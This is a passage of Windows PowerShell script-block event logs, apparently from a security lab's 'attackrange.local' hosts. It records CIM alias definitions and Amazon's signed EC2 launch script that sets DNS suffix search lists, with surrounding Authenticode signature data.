+# tUZcpF/uZOeLC1OVhCW+/VaqTjLZChaMBxzvEIB+RoUcOnxUJL5d3Qd9TAbLpm6i
+# nrm2KC4cgnNkRUsal37xBaTXPqoayv2ZGpkUtay8UkZzYinn3pKyjdWudevHInbO
+# hRY0LFWi9O3PRE3/iyTCCFP63zkcZrIKCC3Qy4U0oFbXQOZ3DsnJtMuC/1j0tUb5
+# veZmgGjgG1/UGR/55o/cI+NiFMpkodqgyV/td4qrOkLg4SVk8ULKkDNxlhLIjOxg
+# WWYEyrEBr1L5BHO6MxmD9DLl2ysotevtX8WVt5wsgfY2pbGYx8nqFKBVPBhW26p/
+# 33axLhgR8rNhhRRkU/W3uT1bW3x0sfssTaF6R3riQhrex27IJFPTLwOeJEQ5UhhE
+# IMdmXSQYEPHEQ4RqUTISJsMJ8KZrwktxpETj0cH3mSkmhFIiMpVwaQ633m5qoYIX
+# PTCCFzkGCisGAQQBgjcDAwExghcpMIIXJQYJKoZIhvcNAQcCoIIXFjCCFxICAQMx
+# DzANBglghkgBZQMEAgEFADB3BgsqhkiG9w0BCRABBKBoBGYwZAIBAQYJYIZIAYb9
+# bAcBMDEwDQYJYIZIAWUDBAIBBQAEIHZBTdEg6m7H1JWYSgkwZqZJca9sn4GAr8Tv
+# //NRYrMmAhBBWvl/ekQTLH0fNK1QEpn/GA8yMDIyMTIyNDA5MjMyNlqgghMHMIIG
+# wDCCBKigAwIBAgIQDE1pckuU+jwqSj0pB4A9WjANBgkqhkiG9w0BAQsFADBjMQsw
+# CQYDVQQGEwJVUzEXMBUGA1UEChMORGlnaUNlcnQsIEluYy4xOzA5BgNVBAMTMkRp
+# Z2lDZXJ0IFRydXN0ZWQgRzQgUlNBNDA5NiBTSEEyNTYgVGltZVN0YW1waW5nIENB
+# MB4XDTIyMDkyMTAwMDAwMFoXDTMzMTEyMTIzNTk1OVowRjELMAkGA1UEBhMCVVMx
+# ETAPBgNVBAoTCERpZ2lDZXJ0MSQwIgYDVQQDExtEaWdpQ2VydCBUaW1lc3RhbXAg
+# MjAyMiAtIDIwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDP7KUmOsap
+# 8mu7jcENmtuh6BSFdDMaJqzQHFUeHjZtvJJVDGH0nQl3PRWWCC9rZKT9BoMW15GS
+# OBwxApb7crGXOlWvM+xhiu</Data><Data Name='ScriptBlockId'>a46c52f8-500d-4346-a94c-955ffcd584f8</Data><Data Name='Path'>C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Scripts\Add-DnsSuffixList.ps1</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:26:31.033067200Z'/><EventRecordID>717134</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-6266-DF2E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>16fc0cc5-8058-472a-9faf-3f50af5b11c2</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:26:31.033046700Z'/><EventRecordID>717128</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-6266-DF2E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>91505045-6510-47f8-a85c-e6ef29ca494a</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:26:31.033029500Z'/><EventRecordID>717122</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-6266-DF2E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>0eb3b12d-ca8c-4ee5-9aac-042f1a982b2c</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:20:43.838405400Z'/><EventRecordID>225557</EventRecordID><Correlation ActivityID='{2EF1732A-5754-0002-A3F8-F72E5457D901}'/><Execution ProcessID='17808' ThreadID='17520'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>bd0bb311-699b-4650-a609-b15006701410</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:20:43.838385300Z'/><EventRecordID>225551</EventRecordID><Correlation ActivityID='{2EF1732A-5754-0002-A3F8-F72E5457D901}'/><Execution ProcessID='17808' ThreadID='17520'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>932be937-ce5b-4c9e-9e90-8f8ce101f0db</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:20:43.838366100Z'/><EventRecordID>225545</EventRecordID><Correlation ActivityID='{2EF1732A-5754-0002-A3F8-F72E5457D901}'/><Execution ProcessID='17808' ThreadID='17520'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>d98ef55d-1ee6-41a0-a949-8cca6aebd52e</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:20:41.533396300Z'/><EventRecordID>225288</EventRecordID><Correlation ActivityID='{2EF1732A-5754-0003-BA81-F62E5457D901}'/><Execution ProcessID='17808' ThreadID='17520'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>2</Data><Data Name='ScriptBlockText'># Copyright 2016 Amazon.com, Inc. or its affiliates. All Rights Reserved.
+#
+# Licensed under the Amazon Software License (the "License").
+# You may not use this file except in compliance with the License.
+# A copy of the License is located at
+#
+# http://aws.amazon.com/asl/
+#
+# or in the "license" file accompanying this file. This file is distributed
+# on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
+# express or implied. See the License for the specific language governing
+# permissions and limitations under the License.
+
+&lt;#-----------------------------------------------------------------------------------------------------------
+    Add-DnsSuffixList adds DNS suffixes.
+-------------------------------------------------------------------------------------------------------------#&gt;
+function Add-DnsSuffixList
+{
+  $state = Get-LaunchConfig -Key AddDnsSuffixList
+  [System.GC]::Collect()
+  if (-not $state)
+  {
+    Write-Log "Adding DNS suffix list is disabled"
+    return
+  }
+
+  $suffixList = @()
+
+  Write-Log ("Adding DNS suffixes in search list begins")
+
+  # Try to create a suffix with available zone
+  try
+  {
+    # Availability-zone includes period at the end, so it needs to remove it.
+    $availabilityZone = (Get-Metadata -UrlFragment "meta-data/placement/availability-zone").Trim()
+    if ($availabilityZone.EndsWith("."))
+    {
+      $availabilityZone = $availabilityZone.Substring(0,$availabilityZone.Length - 1)
+    }
+
+    $suffixList += "{0}.ec2-utilities.amazonaws.com" -f $availabilityZone.Substring(0,$availabilityZone.Length - 1)
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get availability zone: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get global search list
+  try
+  {
+    $tcpRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
+    $tcpRegRes = Get-ItemProperty -Path $tcpRegPath
+    $existingList = $tcpRegRes.SearchList -split ","
+    foreach ($existing in $existingList)
+    {
+      if ($existing -and $suffixList -notcontains $existing)
+      {
+        $suffixList += $existing.ToLower()
+      }
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get global search list: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get DNS Domain
+  try
+  {
+    $dnsDomain = $tcpRegRes.Domain
+    if ($dnsDomain -and $suffixList -notcontains $dnsDomain)
+    {
+      $suffixList += $dnsDomain.ToLower()
+    }
+    $isUsingDomainDevolution = $tcpRegRes.UseDomainNameDevolution
+    if ($isUsingDomainDevolution -ne 0)
+    {
+      $dnsDomains = $dnsDomain -split "\."
+      if ($dnsDomains.Length -gt 2)
+      {
+        $dns = $dnsDomains.Get($dnsDomains.Length - 1)
+        for ($i = $dnsDomains.Length - 2; $i -ge 1; $i --)
+        {
+          $dns = "{0}.{1}" -f $dnsDomains.Get($i),$dns
+          if ($dns -and $suffixList -notcontains $dns)
+          {
+            $suffixList += $dns.ToLower()
+          }
+        }
+      }
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get DNS domain from registry: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get NV Domain - contains computer's primary DNS suffix
+  try
+  {
+    $nvDomain = $tcpRegRes. "NV Domain"
+    if ($nvDomain -and $suffixList -notcontains $nvDomain)
+    {
+      $suffixList += $nvDomain.ToLower()
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get NV domain: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get DNS Domain from connected NICs
+  try
+  {
+    $networkAdapters = Get-CimInstance -ClassName Win32_NetworkAdapter
+    foreach ($networkAdapter in $networkAdapters)
+    {
+      # Check each NIC if it is connected (Connected = 2)
+      if ($networkAdapter.NetConnectionStatus -eq 2)
+      {
+        $networkConfig = Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -Filter "Index='$($networkAdapter.Index)'"
+        $nicDnsDomain = $networkConfig.DNSDomain
+        if ($nicDnsDomain -and $suffixList -notcontains $nicDnsDomain)
+        {
+          $suffixList += $nicDnsDomain.ToLower()
+        }
+      }
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get DNS domain from NICs: {0}" -f $_.Exception.Message)
+  }
+
+  try
+  {
+    # Set DNS suffix search list
+    Invoke-CimMethod -ClassName Win32_NetworkAdapterConfiguration -MethodName "SetDNSSuffixSearchOrder" -Arguments @{ DNSDomainSuffixSearchOrder = $suffixList } | Out-Null
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to set DNS suffix search list: {0}" -f $_.Exception.Message)
+  }
+
+  Write-Log ("Adding DNS suffixes in search list done")
+}
+
+# SIG # Begin signature block
+# MIIuqgYJKoZIhvcNAQcCoIIumzCCLpcCAQExDzANBglghkgBZQMEAgEFADB5Bgor
+# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
+# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAwdXMjmgee8GrG
+# wK7q1ggMNwj1l3PZixsOVf6I/u33B6CCFBkwggXAMIIEqKADAgECAhAP0bvKeWvX
+# +N1MguEKmpYxMA0GCSqGSIb3DQEBCwUAMGwxCzAJBgNVBAYTAlVTMRUwEwYDVQQK
+# EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xKzApBgNV
+# BAMTIkRpZ2lDZXJ0IEhpZ2ggQXNzdXJhbmNlIEVWIFJvb3QgQ0EwHhcNMjIwMTEz
+# MDAwMDAwWhcNMzExMTA5MjM1OTU5WjBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMM
+# RGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQD
+# ExhEaWdpQ2VydCBUcnVzdGVkIFJvb3QgRzQwggIiMA0GCSqGSIb3DQEBAQUAA4IC
+# DwAwggIKAoICAQC/5pBzaN675F1KPDAiMGkz7MKnJS7JIT3yithZwuEppz1Yq3aa
+# za57G4QNxDAf8xukOBbrVsaXbR2rsnnyyhHS5F/WBTxSD1Ifxp4VpX6+n6lXFllV
+# cq9ok3DCsrp1mWpzMpTREEQQLt+C8weE5nQ7bXHiLQwb7iDVySAdYyktzuxeTsiT
+# +CFhmzTrBcZe7FsavOvJz82sNEBfsXpm7nfISKhmV1efVFiODCu3T6cw2Vbuyntd
+# 463JT17lNecxy9qTXtyOj4DatpGYQJB5w3jHtrHEtWoYOAMQjdjUN6QuBX2I9YI+
+# EJFwq1WCQTLX2wRzKm6RAXwhTNS8rhsDdV14Ztk6MUSaM0C/CNdaSaTC5qmgZ92k
+# J7yhTzm1EVgX9yRcRo9k98FpiHaYdj1ZXUJ2h4mXaXpI8OCiEhtmmnTK3kse5w5j
+# rubU75KSOp493ADkRSWJtppEGSt+wJS00mFt6zPZxd9LBADMfRyVw4/3IbKyEbe7
+# f/LVjHAsQWCqsWMYRJUadmJ+9oCw++hkpjPRiQfhvbfmQ6QYuKZ3AeEPlAwhHbJU
+# KSWJbOUOUlFHdL4mrLZBdd56rF+NP8m800ERElvlEFDrMcXKchYiCd98THU/Y+wh
+# X8QgUWtvsauGi0/C1kVfnSD8oR7FwI+isX4KJpn15GkvmB0t9dmpsh3lGwIDAQAB
+# o4IBZjCCAWIwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQU7NfjgtJxXWRM3y5n
+# P+e6mK4cD08wHwYDVR0jBBgwFoAUsT7DaQP4v0cB1JgmGggC72NkK8MwDgYDVR0P
+# AQH/BAQDAgGGMBMGA1UdJQQMMAoGCCsGAQUFBwMDMH8GCCsGAQUFBwEBBHMwcTAk
+# BggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEkGCCsGAQUFBzAC
+# hj1odHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRIaWdoQXNzdXJh
+# bmNlRVZSb290Q0EuY3J0MEsGA1UdHwREMEIwQKA+oDyGOmh0dHA6Ly9jcmwzLmRp
+# Z2ljZXJ0LmNvbS9EaWdpQ2VydEhpZ2hBc3N1cmFuY2VFVlJvb3RDQS5jcmwwHAYD
+# VR0gBBUwEzAHBgVngQwBAzAIBgZngQwBBAEwDQYJKoZIhvcNAQELBQADggEBAEHx
+# qRH0DxNHecllao3A7pgEpMbjDPKisedfYk/ak1k2zfIe4R7sD+EbP5HU5A/C5pg0
+# /xkPZigfT2IxpCrhKhO61z7H0ZL+q93fqpgzRh9Onr3g7QdG64AupP2uU7SkwaT1
+# IY1rzAGt9Rnu15ClMlIr28xzDxj4+87eg3Gn77tRWwR2L62t0+od/P1Tk+WMieNg
+# GbngLyOOLFxJy34riDkruQZhiPOuAnZ2dMFkkbiJUZflhX0901emWG4f7vtpYeJa
+# 3Cgh6GO6Ps9W7Zrk9wXqyvPsEt84zdp7PiuTUy9cUQBY3pBIowrHC/Q7bVUx8ALM
+# R3eWUaNetbxcyEMRoacwggawMIIEmKADAgECAhAIrUCyYNKcTJ9ezam9k67ZMA0G
+# CSqGSIb3DQEBDAUAMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ
+# bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lDZXJ0
+# IFRydXN0ZWQgUm9vdCBHNDAeFw0yMTA0MjkwMDAwMDBaFw0zNjA0MjgyMzU5NTla
+# MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UE
+# AxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBDb2RlIFNpZ25pbmcgUlNBNDA5NiBTSEEz
+# ODQgMjAyMSBDQTEwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDVtC9C
+# 0CiteLdd1TlZG7GIQvUzjOs9gZdwxbvEhSYwn6SOaNhc9es0JAfhS0/TeEP0F9ce
+# 2vnS1WcaUk8OoVf8iJnBkcyBAz5NcCRks43iCH00fUyAVxJrQ5qZ8sU7H/Lvy0da
+# E6ZMswEgJfMQ04uy+wjwiuCdCcBlp/qYgEk1hz1RGeiQIXhFLqGfLOEYwhrMxe6T
+# SXBCMo/7xuoc82VokaJNTIIRSFJo3hC9FFdd6BgTZcV/sk+FLEikVoQ11vkunKoA
+# FdE3/hoGlMJ8yOobMubKwvSnowMOdKWvObarYBLj6Na59zHh3K3kGKDYwSNHR7Oh
+# D26jq22YBoMbt2pnLdK9RBqSEIGPsDsJ18ebMlrC/2pgVItJwZPt4bRc4G/rJvmM
+# 1bL5OBDm6s6R9b7T+2+TYTRcvJNFKIM2KmYoX7BzzosmJQayg9Rc9hUZTO1i4F4z
+# 8ujo7AqnsAMrkbI2eb73rQgedaZlzLvjSFDzd5Ea/ttQokbIYViY9XwCFjyDKK05
+# huzUtw1T0PhH5nUwjewwk3YUpltLXXRhTT8SkXbev1jLchApQfDVxW0mdmgRQRNY
+# mtwmKwH0iU1Z23jPgUo+QEdfyYFQc4UQIyFZYIpkVMHMIRroOBl8ZhzNeDhFMJlP
+# /2NPTLuqDQhTQXxYPUez+rbsjDIJAsxsPAxWEQIDAQABo4IBWTCCAVUwEgYDVR0T
+# AQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQUaDfg67Y7+F8Rhvv+YXsIiGX0TkIwHwYD
+# VR0jBBgwFoAU7NfjgtJxXWRM3y5nP+e6mK4cD08wDgYDVR0PAQH/BAQDAgGGMBMG
+# A1UdJQQMMAoGCCsGAQUFBwMDMHcGCCsGAQUFBwEBBGswaTAkBggrBgEFBQcwAYYY
+# aHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEEGCCsGAQUFBzAChjVodHRwOi8vY2Fj
+# ZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0LmNydDBDBgNV
+# HR8EPDA6MDigNqA0hjJodHRwOi8vY3JsMy5kaWdpY2VydC5jb20vRGlnaUNlcnRU
+# cnVzdGVkUm9vdEc0LmNybDAcBgNVHSAEFTATMAcGBWeBDAEDMAgGBmeBDAEEATAN
+# BgkqhkiG9w0BAQwFAAOCAgEAOiNEPY0Idu6PvDqZ01bgAhql+Eg08yy25nRm95Ry
+# sQDKr2wwJxMSnpBEn0v9nqN8JtU3vDpdSG2V1T9J9Ce7FoFFUP2cvbaF4HZ+N3HL
+# IvdaqpDP9ZNq4+sg0dVQeYiaiorBtr2hSBh+3NiAGhEZGM1hmYFW9snjdufE5Btf
+# Q/g+lP92OT2e1JnPSt0o618moZVYSNUa/tcnP/2Q0XaG3RywYFzzDaju4ImhvTnh
+# OE7abrs2nfvlIVNaw8rpavGiPttDuDPITzgUkpn13c5UbdldAhQfQDN8A+KVssIh
+# dXNSy0bYxDQcoqVLjc1vdjcshT8azibpGL6QB7BDf5WIIIJw8MzK7/0pNVwfiThV
+# 9zeKiwmhywvpMRr/LhlcOXHhvpynCgbWJme3kuZOX956rEnPLqR0kq3bPKSchh/j
+# wVYbKyP/j7XqiHtwa+aguv06P0WmxOgWkVKLQcBIhEuWTatEQOON8BUozu3xGFYH
+# Ki8QxAwIZDwzj64ojDzLj4gLDb879M4ee47vtevLt/B3E+bnKD+sEq6lLyJsQfmC
+# XBVmzGwOysWGw/YmMwwHS6DTBwJqakAwSEs0qFEgu60bhQjiWQ1tygVQK+pKHJ6l
+# /aCnHwZ05/LWUpD9r4VIIflXO7ScA+2GRfS0YW6/aOImYIbqyK+p/pQd52MbOoZW
+# eE4wggedMIIFhaADAgECAhACxyVvD/v+ctpMbqqoNdVVMA0GCSqGSIb3DQEBCwUA
+# MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UE
+# AxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBDb2RlIFNpZ25pbmcgUlNBNDA5NiBTSEEz
+# ODQgMjAyMSBDQTEwHhcNMjIxMTA1MDAwMDAwWhcNMjMxMTA4MjM1OTU5WjCB8jET
+# MBEGCysGAQQBgjc8AgEDEwJVUzEZMBcGCysGAQQBgjc8AgECEwhEZWxhd2FyZTEd
+# MBsGA1UEDwwUUHJpdmF0ZSBPcmdhbml6YXRpb24xEDAOBgNVBAUTBzQxNTI5NTQx
+# CzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdTZWF0
+# dGxlMSIwIAYDVQQKExlBbWF6b24gV2ViIFNlcnZpY2VzLCBJbmMuMRMwEQYDVQQL
+# EwpBbWF6b24gRUMyMSIwIAYDVQQDExlBbWF6b24gV2ViIFNlcnZpY2VzLCBJbmMu
+# MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA0jWbhD4ghdeO4Nndy/2h
+# vCCUPPKnL63myeBZYItXG1dnB5gpJIrBVu40V4OaiNwyUAiBrO5eGM4IaWLqbxvj
+# 324KRuXtmHcXvF7YRgiciflrsfzoUEu4TdKj+owTNA2uektzbVLWzT0wFKe5n4Xe
+# CAqQQe33ODVB+cBTUSv/TRWf3Edni17S8HldwSq+YvPIRv21Shp7fiCxO45ETxwl
+# BsoeNrwLAQz0QpiaGdY5Fb+12jcoWRqYqAiXGeDLA7Wxq1+Xj2n+UwelzhYfcE5/
+# p8w4FsFJi9tVb0aWS63OnP+aTOCrA5bz5j9wq8x25/hCGm6HktmbZRwjKiFQ+HdL
+# g0t3250T9hxvXjudh/DGPCIcmQzKBuxijP8f60DutqLk/EsS+Z5xD/s9/rruXfAj
+# czkZ/xpHLHKa+Fp7x+tIwuC5Zq6VAM6CFgJOWefYG5h8sjZFhrphbnYzs0C75SCx
+# KOKFe6RyrQ+O+xh96ky4kw47zNXbbc7xBqVjLjbOgSTFAgMBAAGjggI1MIICMTAf
+# BgNVHSMEGDAWgBRoN+Drtjv4XxGG+/5hewiIZfROQjAdBgNVHQ4EFgQUOv3VJlso
+# 3pHAv43pOWMQfdVdjXkwLgYDVR0RBCcwJaAjBggrBgEFBQcIA6AXMBUME1VTLURF
+# TEFXQVJFLTQxNTI5NTQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoGCCsGAQUF
+# BwMDMIG1BgNVHR8Ega0wgaowU6BRoE+GTWh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNv
+# bS9EaWdpQ2VydFRydXN0ZWRHNENvZGVTaWduaW5nUlNBNDA5NlNIQTM4NDIwMjFD
+# QTEuY3JsMFOgUaBPhk1odHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRU
+# cnVzdGVkRzRDb2RlU2lnbmluZ1JTQTQwOTZTSEEzODQyMDIxQ0ExLmNybDA9BgNV
+# HSAENjA0MDIGBWeBDAEDMCkwJwYIKwYBBQUHAgEWG2h0dHA6Ly93d3cuZGlnaWNl
+# cnQuY29tL0NQUzCBlAYIKwYBBQUHAQEEgYcwgYQwJAYIKwYBBQUHMAGGGGh0dHA6
+# Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBcBggrBgEFBQcwAoZQaHR0cDovL2NhY2VydHMu
+# ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0VHJ1c3RlZEc0Q29kZVNpZ25pbmdSU0E0MDk2
+# U0hBMzg0MjAyMUNBMS5jcnQwDAYDVR0TAQH/BAIwADANBgkqhkiG9w0BAQsFAAOC
+# AgEARxdSHXYd6BO2G0SQESFEKuC2xGsuekZq4Q//Jg3mHKBkDSLrK1PEriBExb5n
+# JNAmCoh374kLOj9fbV5kPmj2kTdH65b1GVIp4VADVOwla1NGrbqFIvSzUN68xqWw
+# ITM15yR5OU4peuSD8pdxGLwIM3YEsorhVugVI/TZ3oSs89vMNKIUK4qrHvDpveUf
+# 1tQKFYUwyKEkauDqovs2pS7G6+1mqSgXx4Nt1OdZwwdXS8d14xcsaz96C+4G7fAr
+# lbcKiGnHwxlO0FaC+piuverA1NU3lw8UFlTdaQxldKhS47iKZaWTS+mwi2H5PC2G
+# cgXNlQG5tuh/TimhfHpqrvtrXBpNQTU6ydv6E/Bj6DE5VkJGIKua0GvI7LkwFBFC
+# WD1hrAEjtY2LkPAgMDQe9iqPoEGeNwZeEjJjLgayPLP7NsJRdA6uhXboMEFW2LNf
+# VM/hdzl1RG/5kJ4La/mEkpvQRtZRbaSPuSHRxGz//P62qKFQGL0K/YI9RlowyGrQ
+# ENfvztdmqPN8xLJ7C7IuWkx2ygO++4Vva/DaiXX2gMtt6hYYfngOt6+beRWLbpdr
+# cNgUrUJAGg8saVOkrBdziuB0fS93jso0mBvz0DTFXE5vvE8yOYQWR0njIOKbZuB5
+# A15FSIngJ+joE7MFjkxwkQwx5czjrG0GVfqSSK8WiL5yq2wxghnnMIIZ4wIBATB9
+# MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UE
+# AxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBDb2RlIFNpZ25pbmcgUlNBNDA5NiBTSEEz
+# ODQgMjAyMSBDQTECEALHJW8P+/5y2kxuqqg11VUwDQYJYIZIAWUDBAIBBQCgfDAQ
+# BgorBgEEAYI3AgEMMQIwADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgor
+# BgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAvBgkqhkiG9w0BCQQxIgQgW5Ej8brX
+# 5YlTBkoyY2drpoCT/V57IcT8S8Iq8hJJVtswDQYJKoZIhvcNAQEBBQAEggGAt5Ty
+# 7obsD/Z0ezG66VhUH0wII01W42R03uEEvqZg2YFV6D+kt5pnjZ4xSz+Vu0EP3eth
+# tUZcpF/uZOeLC1OVhCW+/VaqTjLZChaMBxzvEIB+RoUcOnxUJL5d3Qd9TAbLpm6i
+# nrm2KC4cgnNkRUsal37xBaTXPqoayv2ZGpkUtay8UkZzYinn3pKyjdWudevHInbO
+# hRY0LFWi9O3PRE3/iyTCCFP63zkcZrIKCC3Qy4U0oFbXQOZ3DsnJtMuC/1j0tUb5
+# veZmgGjgG1/UGR/55o/cI+NiFMpkodqgyV/td4qrOkLg4SVk8ULKkDNxlhLIjOxg
